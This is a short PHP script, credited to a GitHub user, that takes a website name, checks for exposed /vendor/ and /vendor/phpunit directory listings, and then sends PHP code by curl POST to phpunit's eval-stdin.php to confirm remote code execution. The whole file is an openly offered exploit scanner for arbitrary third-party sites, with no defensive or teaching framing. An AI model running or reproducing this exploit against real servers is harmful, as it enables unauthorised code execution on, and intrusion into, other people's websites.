<?php 
/* create by Wilson (wilsc0w on github) */
$website=$argv[1];
echo "VENDOR GRABBER & PHPUNIT RCE EXPLOITER BY WILSON :)\n";
$fgc = @file_get_contents("http://".$website."/vendor/");
if(preg_match("/Index of/",$fgc)) {
    echo "/vendor/ exist !\n";
    $fgc1 = @file_get_contents("http://".$website."/vendor/phpunit");
    if(preg_match("/Index of/",$fgc1)) {
        echo "PHPUNIT folder exist !\n";
        echo "exploiting....\n";
        $o = @system("\ncurl -d '<?php echo 123; ?>' -X POST $website.'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'");
        echo "\n";
        if($o == "123") {
            echo "$website is vulnerable to rce in\n$website/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php :)\n";
        }
        else {
            echo "PHPUNIT not vulnerable :(\n";
        }
    }
    else {
        echo "PHPUNIT folder does not exist ! :(\n";
    }
}
else {
    echo "/vendor/ does not exist :(\n";
}
?>
